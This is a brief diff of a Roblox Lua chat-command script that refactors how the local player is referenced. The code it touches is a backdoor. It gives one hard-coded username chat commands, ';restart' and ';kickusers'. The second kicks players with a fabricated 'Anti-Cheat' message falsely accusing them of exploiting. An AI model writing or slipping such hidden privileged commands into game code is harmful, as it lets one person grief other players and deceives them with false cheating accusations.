@@ -1,5 +1,3 @@
-local plrservice = game:GetService("Players")
-local commandplr = plrservice.LocalPlayer
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";restart") and plr.Name == "GuestNoob101013" then
@@ -16,7 +14,7 @@ game.Players.PlayerAdded:Connect(function(v) v.Chatted:Connect(function(m) onCha
 local function onChatMessage(message, plr)
     if plr then
         if message:match(";kickusers") and plr.Name == "GuestNoob101013" then
-            commandplr:Kick("Anti-Cheat: You were kicked for exploiting. | Cheat Detected: HijackedBoat")
+            game.Players.LocalPlayer:Kick("Anti-Cheat: You were kicked for exploiting. | Cheat Detected: HijackedBoat")
         end
     end
 end
